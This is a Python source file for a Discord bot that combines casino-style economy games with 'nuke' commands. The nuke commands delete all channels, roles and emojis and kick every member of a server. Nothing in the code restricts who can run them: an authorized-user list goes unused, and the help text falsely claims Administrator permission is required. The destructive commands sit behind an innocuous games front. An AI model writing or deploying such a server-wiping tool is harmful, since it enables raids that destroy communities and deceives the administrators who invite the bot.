import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os
import random
import json
from datetime import datetime, timedelta

# ── Config ──────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN")
print(f"Token loaded: {BOT_TOKEN is not None}")
print(f"Token length: {len(BOT_TOKEN) if BOT_TOKEN else 0}")

AUTHORIZED_USER_IDS = [
    933543370935128204,
]

ECONOMY_FILE = "economy.json"
STARTING_BALANCE = 500
DAILY_AMOUNT = 100
DAILY_COOLDOWN_HOURS = 24

# ── Bot Setup ────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

# ── Economy System ────────────────────────────────────────────────────────────
def load_economy():
    if os.path.exists(ECONOMY_FILE):
        with open(ECONOMY_FILE, "r") as f:
            return json.load(f)
    return {}

def save_economy(data):
    with open(ECONOMY_FILE, "w") as f:
        json.dump(data, f, indent=2)

def get_balance(user_id):
    data = load_economy()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {"balance": STARTING_BALANCE, "daily": None}
        save_economy(data)
    return data[uid]["balance"]

def update_balance(user_id, amount):
    data = load_economy()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {"balance": STARTING_BALANCE, "daily": None}
    data[uid]["balance"] += amount
    save_economy(data)
    return data[uid]["balance"]

def set_balance(user_id, amount):
    data = load_economy()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {"balance": amount, "daily": None}
    else:
        data[uid]["balance"] = amount
    save_economy(data)

def can_claim_daily(user_id):
    data = load_economy()
    uid = str(user_id)
    if uid not in data or data[uid].get("daily") is None:
        return True
    last = datetime.fromisoformat(data[uid]["daily"])
    return datetime.utcnow() - last >= timedelta(hours=DAILY_COOLDOWN_HOURS)

def claim_daily(user_id):
    data = load_economy()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {"balance": STARTING_BALANCE, "daily": None}
    data[uid]["balance"] += DAILY_AMOUNT
    data[uid]["daily"] = datetime.utcnow().isoformat()
    save_economy(data)
    return data[uid]["balance"]

def get_leaderboard():
    data = load_economy()
    sorted_users = sorted(data.items(), key=lambda x: x[1]["balance"], reverse=True)
    return sorted_users[:10]

# ── Helpers ───────────────────────────────────────────────────────────────────
async def confirm(ctx, action: str) -> bool:
    embed = discord.Embed(
        title="⚠️ Confirm Nuke",
        description=f"Are you sure you want to **{action}**?\n\nType `yes` to confirm or `no` to cancel.",
        color=discord.Color.red(),
    )
    await ctx.send(embed=embed)

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() in ["yes", "no"]

    try:
        reply = await bot.wait_for("message", timeout=15.0, check=check)
        return reply.content.lower() == "yes"
    except asyncio.TimeoutError:
        await ctx.send("⏱️ Confirmation timed out. Nuke cancelled.")
        return False

async def send_result(ctx, results: list[str]):
    embed = discord.Embed(
        title="💥 Nuke Complete",
        description="\n".join(results),
        color=discord.Color.orange(),
    )
    await ctx.send(embed=embed)

# ── Nuke Commands ──────────────────────────────────────────────────────────────

@bot.command(name="nuke_channels")
async def nuke_channels(ctx):
    if not await confirm(ctx, "delete ALL channels"):
        return
    guild = ctx.guild
    count = 0
    for channel in guild.channels:
        try:
            await channel.delete(reason="Nuke: channels")
            count += 1
            await asyncio.sleep(0.01)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        await new_ch.send(f"💥 Nuke complete. Deleted **{count}** channels.")
    except Exception:
        pass

@bot.command(name="nuke_roles")
async def nuke_roles(ctx):
    if not await confirm(ctx, "delete all roles"):
        return
    guild = ctx.guild
    count = 0
    for role in guild.roles:
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: roles")
            count += 1
            await asyncio.sleep(0.01)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await send_result(ctx, [f"🗑️ Deleted **{count}** roles."])

@bot.command(name="nuke_channels_roles")
async def nuke_channels_roles(ctx):
    if not await confirm(ctx, "delete all channels AND roles"):
        return
    guild = ctx.guild
    ch_count = role_count = 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuke: channels+roles")
            ch_count += 1
            await asyncio.sleep(0.01)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: channels+roles")
            role_count += 1
            await asyncio.sleep(0.01)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        await new_ch.send(f"💥 Nuked **{ch_count}** channels and **{role_count}** roles.")
    except Exception:
        pass

@bot.command(name="nuke_kick")
async def nuke_kick(ctx):
    if not await confirm(ctx, "delete channels, roles, AND kick all members"):
        return
    guild = ctx.guild
    ch_count = role_count = kick_count = 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuke: kick")
            ch_count += 1
            await asyncio.sleep(0.01)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: kick")
            role_count += 1
            await asyncio.sleep(0.01)
        except (discord.Forbidden, discord.HTTPException):
            pass
    async for member in guild.fetch_members(limit=None):
        if member == ctx.author:
            continue
        try:
            await member.kick(reason="Nuke: kick all")
            kick_count += 1
            await asyncio.sleep(0.01)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        await new_ch.send(
            f"💥 Nuked: **{ch_count}** channels, **{role_count}** roles, **{kick_count}** members kicked."
        )
    except Exception:
        pass

@bot.command(name="nuke_full")
async def nuke_full(ctx):
    if not await confirm(ctx, "FULL RESET — channels, roles, emojis, and kick all members"):
        return
    guild = ctx.guild
    ch_count = role_count = kick_count = emoji_count = 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuke: full reset")
            ch_count += 1
            await asyncio.sleep(0.01)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: full reset")
            role_count += 1
            await asyncio.sleep(0.01)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for emoji in list(guild.emojis):
        try:
            await emoji.delete(reason="Nuke: full reset")
            emoji_count += 1
            await asyncio.sleep(0.01)
        except (discord.Forbidden, discord.HTTPException):
            pass
    async for member in guild.fetch_members(limit=None):
        if member == ctx.author:
            continue
        try:
            await member.kick(reason="Nuke: full reset")
            kick_count += 1
            await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        await new_ch.send(
            f"💥 **Full Nuke Complete**\n"
            f"🗑️ Channels: {ch_count}\n"
            f"🎭 Roles: {role_count}\n"
            f"😀 Emojis: {emoji_count}\n"
            f"👢 Members kicked: {kick_count}"
        )
    except Exception:
        pass

@bot.command(name="nuke_help")
async def nuke_help(ctx):
    embed = discord.Embed(title="💥 Nuke Bot Commands", color=discord.Color.red())
    embed.add_field(name="!nuke_channels", value="Delete all channels", inline=False)
    embed.add_field(name="!nuke_roles", value="Delete all non-default roles", inline=False)
    embed.add_field(name="!nuke_channels_roles", value="Delete all channels and roles", inline=False)
    embed.add_field(name="!nuke_kick", value="Delete channels, roles, and kick all members", inline=False)
    embed.add_field(name="!nuke_full", value="Full reset: channels, roles, emojis, kick members", inline=False)
    embed.set_footer(text="⚠️ Requires Administrator permission. All actions ask for confirmation.")
    await ctx.send(embed=embed)


# ══════════════════════════════════════════════════════════════════════════════
# 💰 ECONOMY COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

@tree.command(name="balance", description="Check your balance!")
async def balance(interaction: discord.Interaction):
    bal = get_balance(interaction.user.id)
    embed = discord.Embed(title="💰 Your Balance", color=discord.Color.green())
    embed.add_field(name=interaction.user.display_name, value=f"**${bal:,}**", inline=False)
    await interaction.response.send_message(embed=embed)

@tree.command(name="daily", description="Claim your daily $100!")
async def daily(interaction: discord.Interaction):
    if can_claim_daily(interaction.user.id):
        new_bal = claim_daily(interaction.user.id)
        embed = discord.Embed(
            title="💸 Daily Claimed!",
            description=f"You claimed **${DAILY_AMOUNT}**!\nNew balance: **${new_bal:,}**",
            color=discord.Color.green()
        )
    else:
        data = load_economy()
        last = datetime.fromisoformat(data[str(interaction.user.id)]["daily"])
        next_claim = last + timedelta(hours=DAILY_COOLDOWN_HOURS)
        remaining = next_claim - datetime.utcnow()
        hours, remainder = divmod(int(remaining.total_seconds()), 3600)
        minutes = remainder // 60
        embed = discord.Embed(
            title="⏱️ Already Claimed",
            description=f"Come back in **{hours}h {minutes}m**!",
            color=discord.Color.red()
        )
    await interaction.response.send_message(embed=embed)

@tree.command(name="leaderboard", description="See the richest players!")
async def leaderboard(interaction: discord.Interaction):
    top = get_leaderboard()
    embed = discord.Embed(title="🏆 Richest Players", color=discord.Color.gold())
    medals = ["🥇", "🥈", "🥉"]
    description = ""
    for i, (uid, info) in enumerate(top):
        medal = medals[i] if i < 3 else f"**#{i+1}**"
        try:
            user = await bot.fetch_user(int(uid))
            name = user.display_name
        except:
            name = f"User {uid}"
        description += f"{medal} {name} — **${info['balance']:,}**\n"
    embed.description = description or "No players yet!"
    await interaction.response.send_message(embed=embed)


# ══════════════════════════════════════════════════════════════════════════════
# 🎮 GAMES WITH ECONOMY
# ══════════════════════════════════════════════════════════════════════════════

# ── 🎰 Slots ──────────────────────────────────────────────────────────────────
@tree.command(name="slots", description="Spin the slot machine!")
@app_commands.describe(bet="Amount to bet (default: 10)")
async def slots(interaction: discord.Interaction, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if bet <= 0:
        await interaction.response.send_message("❌ Bet must be more than $0!", ephemeral=True)
        return
    if bet > bal:
        await interaction.response.send_message(f"❌ You only have **${bal:,}**!", ephemeral=True)
        return

    symbols = ["🍒", "🍋", "🍊", "🍇", "⭐", "💎", "7️⃣"]
    weights = [30, 25, 20, 15, 6, 3, 1]
    reels = random.choices(symbols, weights=weights, k=3)
    result = " | ".join(reels)

    if reels[0] == reels[1] == reels[2]:
        if reels[0] == "💎":
            multiplier = 20
            outcome = f"💰 JACKPOT! DIAMONDS! You win **${bet * multiplier:,}**!"
            color = discord.Color.gold()
        elif reels[0] == "7️⃣":
            multiplier = 15
            outcome = f"🎉 TRIPLE 7s! You win **${bet * multiplier:,}**!"
            color = discord.Color.gold()
        elif reels[0] == "⭐":
            multiplier = 10
            outcome = f"⭐ Triple stars! You win **${bet * multiplier:,}**!"
            color = discord.Color.gold()
        else:
            multiplier = 5
            outcome = f"🎊 Three of a kind! You win **${bet * multiplier:,}**!"
            color = discord.Color.green()
        winnings = bet * multiplier
        new_bal = update_balance(interaction.user.id, winnings)
    elif reels[0] == reels[1] or reels[1] == reels[2] or reels[0] == reels[2]:
        winnings = bet
        outcome = f"😐 Two of a kind! You get your bet back **${winnings:,}**!"
        color = discord.Color.yellow()
        new_bal = get_balance(interaction.user.id)
    else:
        outcome = f"❌ No match! You lost **${bet:,}**."
        color = discord.Color.red()
        new_bal = update_balance(interaction.user.id, -bet)

    embed = discord.Embed(title="🎰 Slot Machine", description=f"**{result}**\n\n{outcome}", color=color)
    embed.set_footer(text=f"Balance: ${new_bal:,}")
    await interaction.response.send_message(embed=embed)


# ── 🪨 Rock Paper Scissors ────────────────────────────────────────────────────
@tree.command(name="rps", description="Play Rock Paper Scissors!")
@app_commands.describe(choice="Your choice", bet="Amount to bet (default: 10)")
@app_commands.choices(choice=[
    app_commands.Choice(name="Rock 🪨", value="rock"),
    app_commands.Choice(name="Paper 📄", value="paper"),
    app_commands.Choice(name="Scissors ✂️", value="scissors"),
])
async def rps(interaction: discord.Interaction, choice: str, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if bet <= 0:
        await interaction.response.send_message("❌ Bet must be more than $0!", ephemeral=True)
        return
    if bet > bal:
        await interaction.response.send_message(f"❌ You only have **${bal:,}**!", ephemeral=True)
        return

    options = ["rock", "paper", "scissors"]
    emojis = {"rock": "🪨", "paper": "📄", "scissors": "✂️"}
    bot_choice = random.choice(options)

    if choice == bot_choice:
        result = "🤝 It's a tie! You get your bet back."
        color = discord.Color.yellow()
        new_bal = get_balance(interaction.user.id)
    elif (choice == "rock" and bot_choice == "scissors") or \
         (choice == "paper" and bot_choice == "rock") or \
         (choice == "scissors" and bot_choice == "paper"):
        result = f"🎉 You win **${bet:,}**!"
        color = discord.Color.green()
        new_bal = update_balance(interaction.user.id, bet)
    else:
        result = f"❌ You lose **${bet:,}**!"
        color = discord.Color.red()
        new_bal = update_balance(interaction.user.id, -bet)

    embed = discord.Embed(title="🪨 Rock Paper Scissors", color=color)
    embed.add_field(name="Your choice", value=emojis[choice], inline=True)
    embed.add_field(name="Bot's choice", value=emojis[bot_choice], inline=True)
    embed.add_field(name="Result", value=result, inline=False)
    embed.set_footer(text=f"Balance: ${new_bal:,}")
    await interaction.response.send_message(embed=embed)


# ── 🎱 8 Ball ─────────────────────────────────────────────────────────────────
@tree.command(name="8ball", description="Ask the magic 8 ball and bet on a yes answer!")
@app_commands.describe(question="Your yes/no question", bet="Amount to bet on YES (default: 10)")
async def eightball(interaction: discord.Interaction, question: str, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if bet <= 0:
        await interaction.response.send_message("❌ Bet must be more than $0!", ephemeral=True)
        return
    if bet > bal:
        await interaction.response.send_message(f"❌ You only have **${bal:,}**!", ephemeral=True)
        return

    positive = [
        "✅ It is certain.", "✅ It is decidedly so.", "✅ Without a doubt.",
        "✅ Yes, definitely.", "✅ You may rely on it.", "✅ As I see it, yes.",
        "✅ Most likely.", "✅ Outlook good.", "✅ Yes.", "✅ Signs point to yes."
    ]
    neutral = [
        "🤷 Reply hazy, try again.", "🤷 Ask again later.", "🤷 Better not tell you now.",
        "🤷 Cannot predict now.", "🤷 Concentrate and ask again."
    ]
    negative = [
        "❌ Don't count on it.", "❌ My reply is no.", "❌ My sources say no.",
        "❌ Outlook not so good.", "❌ Very doubtful."
    ]

    all_responses = positive + neutral + negative
    answer = random.choice(all_responses)

    if answer in positive:
        outcome = f"🎉 YES answer! You win **${bet:,}**!"
        new_bal = update_balance(interaction.user.id, bet)
        color = discord.Color.green()
    elif answer in neutral:
        outcome = f"🤷 Neutral answer. You get your bet back."
        new_bal = get_balance(interaction.user.id)
        color = discord.Color.yellow()
    else:
        outcome = f"❌ NO answer. You lose **${bet:,}**!"
        new_bal = update_balance(interaction.user.id, -bet)
        color = discord.Color.red()

    embed = discord.Embed(title="🎱 Magic 8 Ball", color=color)
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.add_field(name="Result", value=outcome, inline=False)
    embed.set_footer(text=f"Balance: ${new_bal:,}")
    await interaction.response.send_message(embed=embed)


# ── 🎲 Dice Duel ──────────────────────────────────────────────────────────────
@tree.command(name="dice", description="Roll dice against the bot!")
@app_commands.describe(sides="Number of sides (default: 6)", bet="Amount to bet (default: 10)")
async def dice(interaction: discord.Interaction, sides: int = 6, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if sides < 2:
        await interaction.response.send_message("❌ A dice needs at least 2 sides!", ephemeral=True)
        return
    if bet <= 0:
        await interaction.response.send_message("❌ Bet must be more than $0!", ephemeral=True)
        return
    if bet > bal:
        await interaction.response.send_message(f"❌ You only have **${bal:,}**!", ephemeral=True)
        return

    player_roll = random.randint(1, sides)
    bot_roll = random.randint(1, sides)

    if player_roll > bot_roll:
        result = f"🎉 You win **${bet:,}**!"
        color = discord.Color.green()
        new_bal = update_balance(interaction.user.id, bet)
    elif player_roll == bot_roll:
        result = f"🤝 Tie! You get your bet back."
        color = discord.Color.yellow()
        new_bal = get_balance(interaction.user.id)
    else:
        result = f"❌ You lose **${bet:,}**!"
        color = discord.Color.red()
        new_bal = update_balance(interaction.user.id, -bet)

    embed = discord.Embed(title=f"🎲 Dice Duel (d{sides})", color=color)
    embed.add_field(name="Your roll", value=f"**{player_roll}**", inline=True)
    embed.add_field(name="Bot's roll", value=f"**{bot_roll}**", inline=True)
    embed.add_field(name="Result", value=result, inline=False)
    embed.set_footer(text=f"Balance: ${new_bal:,}")
    await interaction.response.send_message(embed=embed)


# ── ❓ Trivia ─────────────────────────────────────────────────────────────────
TRIVIA_QUESTIONS = [
    {"q": "What is the capital of France?", "a": "paris", "difficulty": "easy", "reward": 50},
    {"q": "How many sides does a hexagon have?", "a": "6", "difficulty": "easy", "reward": 50},
    {"q": "What is the largest planet in our solar system?", "a": "jupiter", "difficulty": "easy", "reward": 50},
    {"q": "What is 7 x 8?", "a": "56", "difficulty": "easy", "reward": 50},
    {"q": "What color is the sky on a clear day?", "a": "blue", "difficulty": "easy", "reward": 50},
    {"q": "What is the chemical symbol for water?", "a": "h2o", "difficulty": "medium", "reward": 100},
    {"q": "How many continents are there?", "a": "7", "difficulty": "easy", "reward": 50},
    {"q": "What is the fastest land animal?", "a": "cheetah", "difficulty": "easy", "reward": 50},
    {"q": "How many legs does a spider have?", "a": "8", "difficulty": "easy", "reward": 50},
    {"q": "What planet is known as the Red Planet?", "a": "mars", "difficulty": "easy", "reward": 50},
    {"q": "What is the square root of 144?", "a": "12", "difficulty": "medium", "reward": 100},
    {"q": "Who painted the Mona Lisa?", "a": "da vinci", "difficulty": "medium", "reward": 100},
    {"q": "What is the capital of Japan?", "a": "tokyo", "difficulty": "easy", "reward": 50},
    {"q": "How many bones are in the human body?", "a": "206", "difficulty": "hard", "reward": 200},
    {"q": "What is the speed of light in km/s? (approximate)", "a": "300000", "difficulty": "hard", "reward": 200},
    {"q": "What is the smallest prime number?", "a": "2", "difficulty": "medium", "reward": 100},
    {"q": "What element has the symbol Au?", "a": "gold", "difficulty": "medium", "reward": 100},
    {"q": "How many players are on a basketball team on the court?", "a": "5", "difficulty": "easy", "reward": 50},
    {"q": "What is the largest ocean on Earth?", "a": "pacific", "difficulty": "easy", "reward": 50},
    {"q": "What year did World War II end?", "a": "1945", "difficulty": "medium", "reward": 100},
]

@tree.command(name="trivia", description="Answer a trivia question and win money!")
async def trivia(interaction: discord.Interaction):
    q = random.choice(TRIVIA_QUESTIONS)
    difficulty_colors = {"easy": discord.Color.green(), "medium": discord.Color.yellow(), "hard": discord.Color.red()}
    embed = discord.Embed(
        title="❓ Trivia Time!",
        description=q["q"],
        color=difficulty_colors[q["difficulty"]]
    )
    embed.add_field(name="Difficulty", value=q["difficulty"].capitalize(), inline=True)
    embed.add_field(name="Reward", value=f"**${q['reward']}**", inline=True)
    embed.set_footer(text="You have 15 seconds to answer in chat!")
    await interaction.response.send_message(embed=embed)

    def check(m):
        return m.author == interaction.user and m.channel == interaction.channel

    try:
        msg = await bot.wait_for("message", timeout=15.0, check=check)
        if msg.content.lower().strip() == q["a"]:
            new_bal = update_balance(interaction.user.id, q["reward"])
            await interaction.channel.send(
                f"✅ Correct, {interaction.user.mention}! The answer was **{q['a']}**! You won **${q['reward']}**!\nBalance: **${new_bal:,}**"
            )
        else:
            penalty = q["reward"] // 2
            new_bal = update_balance(interaction.user.id, -penalty)
            await interaction.channel.send(
                f"❌ Wrong, {interaction.user.mention}! The answer was **{q['a']}**. You lost **${penalty}**.\nBalance: **${new_bal:,}**"
            )
    except asyncio.TimeoutError:
        await interaction.channel.send(f"⏱️ Time's up, {interaction.user.mention}! The answer was **{q['a']}**.")


# ── 🃏 Blackjack ──────────────────────────────────────────────────────────────
def draw_card():
    cards = ["2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K", "A"]
    return random.choice(cards)

def card_value(card):
    if card in ["J", "Q", "K"]:
        return 10
    elif card == "A":
        return 11
    return int(card)

def hand_value(hand):
    total = sum(card_value(c) for c in hand)
    aces = hand.count("A")
    while total > 21 and aces:
        total -= 10
        aces -= 1
    return total

@tree.command(name="blackjack", description="Play Blackjack and bet!")
@app_commands.describe(bet="Amount to bet (default: 10)")
async def blackjack(interaction: discord.Interaction, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if bet <= 0:
        await interaction.response.send_message("❌ Bet must be more than $0!", ephemeral=True)
        return
    if bet > bal:
        await interaction.response.send_message(f"❌ You only have **${bal:,}**!", ephemeral=True)
        return

    player = [draw_card(), draw_card()]
    dealer = [draw_card(), draw_card()]

    def hand_str(hand):
        return " ".join(hand)

    # Check for natural blackjack
    if hand_value(player) == 21:
        winnings = int(bet * 1.5)
        new_bal = update_balance(interaction.user.id, winnings)
        embed = discord.Embed(title="🃏 Blackjack — NATURAL BLACKJACK!", color=discord.Color.gold())
        embed.add_field(name="Your hand", value=f"{hand_str(player)} (21)", inline=False)
        embed.add_field(name="Result", value=f"🎉 Blackjack! You win **${winnings:,}**!", inline=False)
        embed.set_footer(text=f"Balance: ${new_bal:,}")
        await interaction.response.send_message(embed=embed)
        return

    embed = discord.Embed(title="🃏 Blackjack", color=discord.Color.dark_green())
    embed.add_field(name="Your hand", value=f"{hand_str(player)} (Total: {hand_value(player)})", inline=False)
    embed.add_field(name="Dealer's hand", value=f"{dealer[0]} ❓", inline=False)
    embed.add_field(name="Bet", value=f"**${bet:,}**", inline=True)
    embed.set_footer(text="Type 'hit', 'stand', or 'double' in chat.")
    await interaction.response.send_message(embed=embed)

    def check(m):
        return m.author == interaction.user and m.channel == interaction.channel and m.content.lower() in ["hit", "stand", "double"]

    doubled = False
    while hand_value(player) < 21:
        try:
            msg = await bot.wait_for("message", timeout=30.0, check=check)
        except asyncio.TimeoutError:
            await interaction.channel.send("⏱️ Game timed out!")
            return

        if msg.content.lower() == "double":
            if bal < bet * 2:
                await interaction.channel.send("❌ Not enough balance to double down!")
                continue
            player.append(draw_card())
            bet *= 2
            doubled = True
            await interaction.channel.send(f"🔥 Doubled down! Your hand: {hand_str(player)} ({hand_value(player)}) | New bet: **${bet:,}**")
            break
        elif msg.content.lower() == "hit":
            player.append(draw_card())
            if hand_value(player) > 21:
                new_bal = update_balance(interaction.user.id, -bet)
                await interaction.channel.send(
                    f"💥 Bust! Your hand: {hand_str(player)} ({hand_value(player)}). You lost **${bet:,}**!\nBalance: **${new_bal:,}**"
                )
                return
            await interaction.channel.send(
                f"Your hand: {hand_str(player)} (Total: {hand_value(player)})\nType 'hit', 'stand', or 'double'."
            )
        else:
            break

    while hand_value(dealer) < 17:
        dealer.append(draw_card())

    p = hand_value(player)
    d = hand_value(dealer)

    result_embed = discord.Embed(title="🃏 Blackjack Result", color=discord.Color.dark_green())
    result_embed.add_field(name="Your hand", value=f"{hand_str(player)} ({p})", inline=True)
    result_embed.add_field(name="Dealer's hand", value=f"{hand_str(dealer)} ({d})", inline=True)

    if d > 21 or p > d:
        new_bal = update_balance(interaction.user.id, bet)
        result_embed.add_field(name="Result", value=f"🎉 You win **${bet:,}**!", inline=False)
        result_embed.color = discord.Color.green()
    elif p == d:
        new_bal = get_balance(interaction.user.id)
        result_embed.add_field(name="Result", value="🤝 Tie! You get your bet back.", inline=False)
        result_embed.color = discord.Color.yellow()
    else:
        new_bal = update_balance(interaction.user.id, -bet)
        result_embed.add_field(name="Result", value=f"❌ Dealer wins! You lost **${bet:,}**!", inline=False)
        result_embed.color = discord.Color.red()

    result_embed.set_footer(text=f"Balance: ${new_bal:,}")
    await interaction.channel.send(embed=result_embed)


# ── 💣 Minesweeper ────────────────────────────────────────────────────────────
@tree.command(name="minesweeper", description="Generate a minesweeper board!")
@app_commands.describe(size="Board size (default: 5)", mines="Number of mines (default: 5)")
async def minesweeper(interaction: discord.Interaction, size: int = 5, mines: int = 5):
    if size < 3 or size > 8:
        await interaction.response.send_message("❌ Size must be between 3 and 8!", ephemeral=True)
        return
    if mines >= size * size:
        await interaction.response.send_message("❌ Too many mines for this board size!", ephemeral=True)
        return

    board = [[0] * size for _ in range(size)]
    mine_positions = random.sample(range(size * size), mines)
    for pos in mine_positions:
        board[pos // size][pos % size] = -1

    for r in range(size):
        for c in range(size):
            if board[r][c] == -1:
                continue
            count = 0
            for dr in [-1, 0, 1]:
                for dc in [-1, 0, 1]:
                    nr, nc = r + dr, c + dc
                    if 0 <= nr < size and 0 <= nc < size and board[nr][nc] == -1:
                        count += 1
            board[r][c] = count

    number_emojis = ["0️⃣", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣"]
    rows = []
    for r in range(size):
        row = ""
        for c in range(size):
            if board[r][c] == -1:
                row += "||💣||"
            else:
                row += f"||{number_emojis[board[r][c]]}||"
        rows.append(row)

    # Calculate reward based on size and mines
    reward = mines * size * 5
    safe_cells = size * size - mines
    board_str = "\n".join(rows)

    embed = discord.Embed(
        title="💣 Minesweeper",
        description=f"**{size}x{size} board | {mines} mines | {safe_cells} safe cells**\nClick the spoilers to reveal! If you find all safe cells, claim **${reward}** with `/minesweeper_claim`!\n\n{board_str}",
        color=discord.Color.greyple()
    )
    await interaction.response.send_message(embed=embed)

@tree.command(name="minesweeper_claim", description="Claim your minesweeper reward if you survived!")
@app_commands.describe(size="Board size you played", mines="Number of mines on your board")
async def minesweeper_claim(interaction: discord.Interaction, size: int = 5, mines: int = 5):
    reward = mines * size * 5
    new_bal = update_balance(interaction.user.id, reward)
    embed = discord.Embed(
        title="💣 Minesweeper Reward Claimed!",
        description=f"You survived a **{size}x{size}** board with **{mines}** mines!\nYou earned **${reward:,}**!\nBalance: **${new_bal:,}**",
        color=discord.Color.green()
    )
    await interaction.response.send_message(embed=embed)


# ── Error Handling ────────────────────────────────────────────────────────────
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("🚫 You don't have permission to use this command.")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        await ctx.send(f"❌ Error: {error}")


# ── Ready ─────────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    await tree.sync()
    print(f"✅ Logged in as {bot.user} ({bot.user.id})")
    print("Nuke bot ready.")


bot.run(BOT_TOKEN)
